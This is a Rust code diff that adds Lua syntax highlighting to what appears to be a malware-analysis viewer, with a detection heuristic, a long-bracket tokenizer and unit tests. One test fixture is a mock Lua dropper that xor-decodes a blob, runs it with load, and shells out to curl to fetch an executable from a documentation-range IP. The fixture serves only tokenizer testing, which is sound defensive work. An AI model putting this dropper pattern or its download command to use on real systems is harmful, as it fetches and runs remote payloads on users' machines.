@@ -2,11 +2,12 @@
 //!
 //! A single generic tokenizer (driven by a per-language [`Spec`]) covers the
 //! script / C-like languages malware analysts actually meet — JS, PowerShell,
-//! VBA, VBScript, Python, shell, batch, PHP, and friends — plus small dedicated
-//! tokenizers for JSON, XML/HTML, and Markdown. The language is auto-detected
-//! from the file extension, falling back to a content sniff. Everything is byte
-//! offsets into the text, and every span boundary lands on an ASCII byte (words
-//! and strings absorb any UTF-8 continuation bytes), so slicing is always valid.
+//! VBA, VBScript, Python, Lua, shell, batch, PHP, and friends — plus small
+//! dedicated tokenizers for JSON, XML/HTML, and Markdown. The language is
+//! auto-detected from the file extension, falling back to a content sniff.
+//! Everything is byte offsets into the text, and every span boundary lands on an
+//! ASCII byte (words and strings absorb any UTF-8 continuation bytes), so
+//! slicing is always valid.
 
 use eframe::egui::{self, text::LayoutJob, Color32, FontId, TextFormat};
 
@@ -143,6 +144,11 @@ enum StrEsc {
     /// escaped quote, so the string never closes and the rest of the file is
     /// swallowed as one literal.
     Doubled,
+    /// `\` escapes the next byte — so `\"` and a trailing `\` line-continuation
+    /// both work — but an unescaped newline ends the string (Lua, where a short
+    /// string may not span a line). Stopping at the newline costs an unbalanced
+    /// quote one line instead of the rest of the file.
+    BackslashLine,
 }
 
 /// A language spec for the generic tokenizer: comment/​string/​keyword shapes.
@@ -163,6 +169,9 @@ pub struct Spec {
     /// `&H1F` / `&O17` radix literals (VB family), where a bare `&` is instead
     /// the string-concatenation operator.
     amp_radix: bool,
+    /// Lua's long brackets: `[[ ... ]]` / `[==[ ... ]==]` strings, and the
+    /// `--[[ ... ]]` block comments built on the same form.
+    long_brackets: bool,
 }
 
 // ---- language table ---------------------------------------------------------
@@ -595,6 +604,77 @@ const KW_PHP: &[&str] = &[
     "gzinflate",
 ];
 
+/// Lua — the scripting runtime embedded in game clients, network appliances and
+/// a growing number of implants, so a carved `.lua` stage is ordinary triage
+/// material. Reserved words first, then the base library. The trailing block is
+/// the runtime that actually does the work in a Lua dropper: `load` /
+/// `loadstring` over a decoded buffer, `os.execute`, `io.popen`, and LuaJIT's
+/// `ffi`, which reaches straight into Win32 without a single Lua-level import.
+const KW_LUA: &[&str] = &[
+    // reserved words
+    "and",
+    "break",
+    "do",
+    "else",
+    "elseif",
+    "end",
+    "false",
+    "for",
+    "function",
+    "goto",
+    "if",
+    "in",
+    "local",
+    "nil",
+    "not",
+    "or",
+    "repeat",
+    "return",
+    "then",
+    "true",
+    "until",
+    "while",
+    // base library
+    "assert",
+    "collectgarbage",
+    "error",
+    "getmetatable",
+    "setmetatable",
+    "ipairs",
+    "pairs",
+    "next",
+    "pcall",
+    "xpcall",
+    "print",
+    "rawget",
+    "rawset",
+    "select",
+    "tonumber",
+    "tostring",
+    "type",
+    "unpack",
+    "self",
+    "_G",
+    "_ENV",
+    // library roots — `os.execute`, `io.popen`, `string.char` hang off these
+    "coroutine",
+    "debug",
+    "io",
+    "math",
+    "os",
+    "package",
+    "string",
+    "table",
+    // the runtime a triage analyst is actually hunting for
+    "load",
+    "loadstring",
+    "loadfile",
+    "dofile",
+    "require",
+    "ffi",
+    "jit",
+];
+
 /// Defaults for the language table; each entry below states only what differs.
 const BASE: Spec = Spec {
     line_comments: &[],
@@ -606,6 +686,7 @@ const BASE: Spec = Spec {
     ci_keywords: false,
     var_sigil: None,
     amp_radix: false,
+    long_brackets: false,
 };
 
 const C_LIKE: Spec = Spec {
@@ -672,6 +753,16 @@ const PHP: Spec = Spec {
     var_sigil: Some(b'$'),
     ..BASE
 };
+// Lua's block comment is `--` followed by a long bracket, so it is driven by
+// `long_brackets` rather than by a fixed `block` pair — `--[==[` has no single
+// closing marker to name here.
+const LUA: Spec = Spec {
+    line_comments: &["--"],
+    keywords: KW_LUA,
+    esc: StrEsc::BackslashLine,
+    long_brackets: true,
+    ..BASE
+};
 
 /// Detect the language from the file name, falling back to a content sniff.
 pub fn detect(file_name: &str, text: &str) -> Lang {
@@ -694,6 +785,7 @@ pub fn detect(file_name: &str, text: &str) -> Lang {
         // and classes and VB.NET — all typed VB rather than VBScript.
         "bas" | "cls" | "frm" | "vba" | "vb" => return Lang::Generic(VBA),
         "php" | "php5" | "phtml" | "pl" | "pm" | "rb" => return Lang::Generic(PHP),
+        "lua" | "wlua" => return Lang::Generic(LUA),
         "json" => return Lang::Json,
         "xml" | "html" | "htm" | "xhtml" | "svg" | "xaml" | "plist" | "hta" | "config" => {
             return Lang::Xml
@@ -726,6 +818,9 @@ fn sniff(text: &str) -> Lang {
         if lower_first.contains("node") {
             return Lang::Generic(JS);
         }
+        if lower_first.contains("lua") {
+            return Lang::Generic(LUA);
+        }
         return Lang::Generic(SH);
     }
     if head.starts_with("<?php") {
@@ -749,6 +844,11 @@ fn sniff(text: &str) -> Lang {
     // `Public Function ...` module for JS.
     if looks_like_vba(head) {
         return Lang::Generic(VBA);
+    }
+    // Likewise before the JavaScript heuristic: `function f()` opens a Lua
+    // chunk just as readily as a JS one.
+    if looks_like_lua(head) {
+        return Lang::Generic(LUA);
     }
     if lower_first.contains("function ") || head.contains("=>") || head.contains("var ") {
         return Lang::Generic(JS);
@@ -795,6 +895,40 @@ fn looks_like_vba(head: &str) -> bool {
     })
 }
 
+/// Lua source with no usable extension — a stage carved out of a binary, or an
+/// embedded script dropped without a name. `function` is shared with JavaScript
+/// and `local` with shell, so neither on its own is enough: this keys on the
+/// forms nothing else in the table writes (`local function`, a `--[[` long
+/// comment), or on a declaration paired with the bare `end` that closes it —
+/// JavaScript closes with `}`, shell with `fi` / `done`, and VB writes `End
+/// Sub`, which the VBA sniff has already claimed by the time we get here.
+fn looks_like_lua(head: &str) -> bool {
+    let lines = || head.lines().take(40).map(str::trim_start);
+    if lines()
+        .any(|t| t.starts_with("local function ") || t.starts_with("--[[") || t.starts_with("--[="))
+    {
+        return true;
+    }
+    // A declaration names something: `local x`, `function f`. `local = 1` is not
+    // Lua at all, and accepting it would claim any file that uses the word.
+    let named = |t: &str| {
+        ["local ", "function "].iter().any(|p| {
+            t.strip_prefix(p)
+                .is_some_and(|r| r.starts_with(|c: char| c.is_alphabetic() || c == '_'))
+        })
+    };
+    // `end`, `end)`, `end,` all close a Lua block. `endpoint` is an identifier,
+    // `end {` opens a PowerShell block, and `end = 2` is an assignment — Lua has
+    // a form for none of the three.
+    let closes = |t: &str| {
+        t.strip_prefix("end").is_some_and(|r| {
+            !r.starts_with(|c: char| c.is_alphanumeric() || c == '_')
+                && !matches!(r.trim_start().as_bytes().first(), Some(b'{') | Some(b'='))
+        })
+    };
+    lines().any(named) && lines().any(closes)
+}
+
 /// The languages offered in the manual override picker, with display names.
 pub fn selectable() -> &'static [(&'static str, Lang)] {
     &[
@@ -807,6 +941,7 @@ pub fn selectable() -> &'static [(&'static str, Lang)] {
         ("VBA / VB6 macro", Lang::Generic(VBA)),
         ("VBScript", Lang::Generic(VBS)),
         ("PHP / Perl", Lang::Generic(PHP)),
+        ("Lua", Lang::Generic(LUA)),
         ("JSON", Lang::Json),
         ("XML / HTML", Lang::Xml),
         ("Markdown", Lang::Markdown),
@@ -911,6 +1046,43 @@ fn is_word(b: u8) -> bool {
     b.is_ascii_alphanumeric() || b == b'_' || b >= 0x80
 }
 
+/// If a Lua long bracket opens at `open` — `[`, then `level` `=` signs, then a
+/// second `[` — return the index just past its matching `]`+`level`+`]`, or the
+/// end of `src` when it is never closed. `None` when `open` is an ordinary `[`,
+/// which is how Lua's own lexer tells `t[i]` from `t[[str]]`.
+///
+/// The level is uncapped, as it is in Lua. That costs nothing on crafted input:
+/// the scan below compares bytes only at a `]`, and only for as long as `=`
+/// signs keep following it, so the work at each `]` is the length of its own run
+/// of `=`. A byte belongs to one such run, which keeps the whole scan linear
+/// however deep the bracket is.
+fn long_bracket_end(src: &[u8], open: usize) -> Option<usize> {
+    let n = src.len();
+    if src.get(open) != Some(&b'[') {
+        return None;
+    }
+    let mut level = 0;
+    while src.get(open + 1 + level) == Some(&b'=') {
+        level += 1;
+    }
+    if src.get(open + 1 + level) != Some(&b'[') {
+        return None;
+    }
+    let mut j = open + level + 2;
+    while j < n {
+        // Only a `]` can open the closer, so the comparison runs at those bytes
+        // alone, and short-circuits on the first byte that is not an `=`.
+        if src[j] == b']' {
+            let close = j + level + 1;
+            if close < n && src[j + 1..close].iter().all(|&c| c == b'=') && src[close] == b']' {
+                return Some(close + 1);
+            }
+        }
+        j += 1;
+    }
+    Some(n) // unterminated: it runs to EOF, exactly as Lua would read it
+}
+
 fn tokenize_generic(src: &[u8], spec: &Spec, out: &mut Vec<Span>) {
     let n = src.len();
     let mut i = 0;
@@ -926,6 +1098,24 @@ fn tokenize_generic(src: &[u8], spec: &Spec, out: &mut Vec<Span>) {
                 }
                 i = (i + close.len()).min(n);
                 out.push(Span::new(start, i, Tok::Comment));
+                continue;
+            }
+        }
+        // Lua long brackets: `[[ ... ]]` / `[==[ ... ]==]` strings, and the
+        // `--[[ ... ]]` comments built on them. Both have to be tried before the
+        // line comments below, or a block comment would end at its first newline
+        // and the rest of it would colour as live code.
+        if spec.long_brackets {
+            let long = if src[i..].starts_with(b"--") {
+                long_bracket_end(src, i + 2).map(|e| (e, Tok::Comment))
+            } else if b == b'[' {
+                long_bracket_end(src, i).map(|e| (e, Tok::Str))
+            } else {
+                None
+            };
+            if let Some((end, tok)) = long {
+                out.push(Span::new(i, end, tok));
+                i = end;
                 continue;
             }
         }
@@ -968,13 +1158,13 @@ fn tokenize_generic(src: &[u8], spec: &Spec, out: &mut Vec<Span>) {
             i += 1;
             while i < n {
                 match spec.esc {
-                    StrEsc::Backslash if src[i] == b'\\' && i + 1 < n => {
+                    StrEsc::Backslash | StrEsc::BackslashLine if src[i] == b'\\' && i + 1 < n => {
                         i += 2;
                         continue;
                     }
-                    // A VB string ends at the newline, so one stray quote
+                    // A VB or Lua string ends at the newline, so one stray quote
                     // cannot colour the remainder of the file.
-                    StrEsc::Doubled if src[i] == b'\n' => break,
+                    StrEsc::Doubled | StrEsc::BackslashLine if src[i] == b'\n' => break,
                     StrEsc::Doubled if src[i] == b && i + 1 < n && src[i + 1] == b => {
                         i += 2;
                         continue;
@@ -1827,6 +2017,191 @@ End Sub"#;
         assert_eq!(tok_of(src, Lang::Yara, "{\n con"), None);
     }
 
+    /// A Lua stage in the shape they arrive in: a `[[ ]]`-packed blob, a decode
+    /// loop, a long comment parking the loader, and `load` handing the decoded
+    /// chunk straight back to the interpreter. Address is RFC 5737
+    /// documentation space.
+    const LUA_SAMPLE: &str = r#"local ffi = require("ffi")
+
+-- stage two, xor-packed
+local blob = [[7f454c4602010100]]
+
+local function decode(s, key)
+    local out = {}
+    for i = 1, #s do
+        out[i] = string.char(s:byte(i) ~ key)
+    end
+    return table.concat(out)
+end
+
+--[==[ the loader stays parked in a long comment
+       until the dropper is ready to call it ]==]
+local chunk = load(decode(blob, 0x5A))
+if chunk ~= nil then
+    chunk()
+    os.execute("curl http://192.0.2.1/b -o \"C:\\t.exe\"")
+end
+"#;
+
+    #[test]
+    fn lua_detection() {
+        assert_eq!(detect("stage.lua", ""), Lang::Generic(LUA));
+        assert_eq!(detect("S.WLUA", ""), Lang::Generic(LUA));
+        assert_eq!(name(Lang::Generic(LUA)), "Lua");
+        assert_eq!(
+            detect("x", "#!/usr/bin/lua\nprint(1)\n"),
+            Lang::Generic(LUA)
+        );
+        // Extensionless / renamed chunks fall to the content sniff.
+        assert_eq!(detect("dump", LUA_SAMPLE), Lang::Generic(LUA));
+        assert_eq!(
+            detect("x", "local function f(a)\n  return a\nend\n"),
+            Lang::Generic(LUA)
+        );
+        assert_eq!(
+            detect("x", "--[[ header ]]\nprint(1)\n"),
+            Lang::Generic(LUA)
+        );
+        // `function` closed by a bare `end` is Lua.
+        assert_eq!(
+            detect("x", "function f()\n  return 1\nend\n"),
+            Lang::Generic(LUA)
+        );
+    }
+
+    #[test]
+    fn lua_sniff_does_not_steal_other_languages() {
+        // `function` is shared with JavaScript and `local` with shell, so the
+        // Lua sniff must not claim either on that alone. The shell cases assert
+        // on the predicate as well as on `detect`, because a script with a
+        // shebang returns from `sniff` before the Lua check is ever reached.
+        assert!(!looks_like_lua("f() {\n  local x=1\n}\n"));
+        assert_eq!(detect("x", "f() {\n  local x=1\n}\n"), Lang::Plain);
+        assert_eq!(detect("x", "function f() { return 1; }"), Lang::Generic(JS));
+        // A PowerShell advanced function has a `function` line and an `end`
+        // block, but writes `end {`, which is not a Lua block close.
+        assert!(!looks_like_lua(
+            "function Get-X {\n  end {\n    1\n  }\n}\n"
+        ));
+        // A declaration has to name something, and `end` has to close a block
+        // rather than be assigned to — otherwise any file using both words is
+        // read as Lua.
+        assert!(!looks_like_lua(
+            "import os\nlocal = 1\nend = 2\nprint(local)\n"
+        ));
+        assert_eq!(
+            detect("x", "import os\nlocal = 1\nend = 2\nprint(local)\n"),
+            Lang::Plain
+        );
+    }
+
+    #[test]
+    fn lua_tokens() {
+        let l = Lang::Generic(LUA);
+        let s = LUA_SAMPLE;
+        assert_eq!(tok_of(s, l, "local"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "require"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "-- stage"), Some(Tok::Comment));
+        assert_eq!(tok_of(s, l, "[[7f"), Some(Tok::Str)); // long-string blob
+        assert_eq!(tok_of(s, l, "--[==["), Some(Tok::Comment)); // levelled comment
+        assert_eq!(tok_of(s, l, "decode"), Some(Tok::Func));
+        assert_eq!(tok_of(s, l, "string"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "char"), Some(Tok::Func)); // `string.char` call
+        assert_eq!(tok_of(s, l, "0x5A"), Some(Tok::Number));
+        assert_eq!(tok_of(s, l, "load("), Some(Tok::Keyword)); // the eval primitive
+        assert_eq!(tok_of(s, l, "os.execute"), Some(Tok::Keyword));
+        assert_eq!(tok_of(s, l, "execute"), Some(Tok::Func));
+        assert_eq!(tok_of(s, l, "\"curl"), Some(Tok::Str));
+        assert_clean(s, l);
+    }
+
+    #[test]
+    fn lua_long_strings_and_comments() {
+        let l = Lang::Generic(LUA);
+        // The closer has to match the opener's `=` count, so an inner `]]` does
+        // not end an outer `[==[`.
+        let src = "x = [==[ a ]] b ]==]\nlocal y = 1\n";
+        // The span, not just the class: closing on the inner `]]` would stop at
+        // 13 and still leave that `]]` itself coloured as a string.
+        assert_eq!(spans(src, l)[0], (4, 20, Tok::Str));
+        assert_eq!(tok_of(src, l, "b"), Some(Tok::Str)); // past the inner `]]`
+        assert_eq!(tok_of(src, l, "local"), Some(Tok::Keyword));
+        assert_clean(src, l);
+        // A `--[[` comment spans lines, and the code after it is live again.
+        // Read as a plain `--` line comment, the body would colour as code.
+        let c = "--[[ hidden\nstill hidden ]]\nos.exit()\n";
+        assert_eq!(tok_of(c, l, "still"), Some(Tok::Comment));
+        assert_eq!(tok_of(c, l, "os"), Some(Tok::Keyword));
+        assert_clean(c, l);
+        // `--` not followed by a bracket is still an ordinary line comment.
+        let n = "-- note\nlocal a = b--c\nlocal d = 2\n";
+        assert_eq!(tok_of(n, l, "-- note"), Some(Tok::Comment));
+        assert_eq!(tok_of(n, l, "--c"), Some(Tok::Comment));
+        assert_eq!(tok_of(n, l, "local d"), Some(Tok::Keyword));
+        assert_clean(n, l);
+    }
+
+    #[test]
+    fn lua_long_bracket_is_not_an_index() {
+        // Lua's own lexer decides on the byte after `[`: `t[i]` indexes, `t[[s]]`
+        // passes a long string. Reading an index as a string would swallow
+        // everything up to the next `]]`.
+        let l = Lang::Generic(LUA);
+        assert_eq!(tok_of("t[i] = 1", l, "[i]"), None);
+        assert_eq!(tok_of("t[a[b]] = 1", l, "[a"), None);
+        assert_eq!(tok_of("f[[s]]", l, "[[s]]"), Some(Tok::Str));
+        // A `[` that opens nothing is ordinary punctuation.
+        for src in ["[", "[=", "[==", "[=x[", "]]", "]==]", "t[ [[s]] ]"] {
+            assert_clean(src, l);
+        }
+    }
+
+    #[test]
+    fn lua_long_bracket_levels() {
+        // Every level in each shape: closed at its own level, closed at the
+        // wrong one, and never closed. Lua puts no limit on the depth, and
+        // cross-checking against the reference interpreter shows it accepts at
+        // least 64, so nothing here may cap it either.
+        let l = Lang::Generic(LUA);
+        for level in 0..=72 {
+            let eq = "=".repeat(level);
+            for body in ["", "x", "\n", "a\nb", "é日𝄞"] {
+                for tail in ["", "]]", "]=]", "]==]"] {
+                    assert_clean(&format!("[{eq}[{body}{tail}"), l);
+                    assert_clean(&format!("--[{eq}[{body}{tail}"), l);
+                }
+                let m = format!("[{eq}[{body}]{eq}] tail");
+                assert_clean(&m, l);
+                let sp = spans(&m, l);
+                assert_eq!(sp.len(), 1, "level {level}");
+                assert_eq!(sp[0], (0, m.len() - 5, Tok::Str), "level {level}");
+            }
+        }
+    }
+
+    #[test]
+    fn lua_strings_end_at_the_line_but_keep_escapes() {
+        let l = Lang::Generic(LUA);
+        // `\"` is an escape, so the literal runs past it to the real closer.
+        let src = "os.execute(\"start \\\"C:\\\\a.exe\\\"\")\nlocal x = 1\n";
+        assert_eq!(tok_of(src, l, "\"start"), Some(Tok::Str));
+        // Past the escaped quote: with `\` treated as an ordinary byte the
+        // literal would have closed at `\"` and left this outside the string.
+        assert_eq!(tok_of(src, l, "a.exe"), Some(Tok::Str));
+        assert_eq!(tok_of(src, l, "local"), Some(Tok::Keyword));
+        assert_clean(src, l);
+        // An unterminated quote stops at the newline: one bad line must not
+        // colour the rest of the script.
+        let un = "local a = \"oops\nload(b)\n";
+        assert_eq!(tok_of(un, l, "load"), Some(Tok::Keyword));
+        assert_clean(un, l);
+        // A trailing `\` continues the literal onto the next line.
+        let cont = "local a = \"one\\\ntwo\"\nload(c)\n";
+        assert_eq!(tok_of(cont, l, "two"), Some(Tok::Str));
+        assert_eq!(tok_of(cont, l, "load"), Some(Tok::Keyword));
+        assert_clean(cont, l);
+    }
+
     #[test]
     fn adversarial_inputs_stay_clean() {
         // Unterminated / malformed input must not panic and must keep the span
@@ -1846,12 +2221,20 @@ End Sub"#;
             "&H",
             ".",
             "\"\"\"",
+            "[[",
+            "--[[",
+            "--[=[ never closed",
+            "[==[",
+            "]]",
+            "[=[a]=",
+            "--",
         ];
         let langs = [
             Lang::Generic(JS),
             Lang::Generic(VBS),
             Lang::Generic(VBA),
             Lang::Generic(BAT),
+            Lang::Generic(LUA),
             Lang::Json,
             Lang::Xml,
             Lang::Markdown,
@@ -1887,8 +2270,8 @@ End Sub"#;
         const ALPHABET: &[&str] = &[
             "\"", "'", "\\", "\n", "\r", "&H", "&O", "&", "Rem", "rem", ".", "..", "{", "}", "/*",
             "*/", "//", "::", "<#", "#>", "<!--", "-->", "#", "$", "%", "`", "[", "]", "(", ")",
-            "0x1", "9", "é", "日", "_", "<a", "/>", ">", "*", "|", "?", "-", ":", "=", "\"\"", " ",
-            "Sub", "End", "a",
+            "0x1", "9", "é", "日", "𝄞", "_", "<a", "/>", ">", "*", "|", "?", "-", ":", "=", "\"\"",
+            " ", "Sub", "End", "a", "--", "[[", "]]", "[=[", "]=]", "[==[", "]==]", "--[[", "end",
         ];
         let langs = [
             Lang::Plain,
@@ -1901,6 +2284,7 @@ End Sub"#;
             Lang::Generic(VBS),
             Lang::Generic(VBA),
             Lang::Generic(PHP),
+            Lang::Generic(LUA),
             Lang::Json,
             Lang::Xml,
             Lang::Markdown,
@@ -1929,6 +2313,7 @@ End Sub"#;
         // Non-ASCII bytes inside words/strings must not split a codepoint.
         let src = "let café = \"naïve → 日本語\"; // 你好";
         assert_clean(src, Lang::Generic(JS));
+        assert_clean("local s = [[naïve 日本語 𝄞]] -- 你好", Lang::Generic(LUA));
         assert_clean("# 标题 `代码`", Lang::Markdown);
         assert_clean("{ \"café\": \"naïve\" }", Lang::Json);
     }
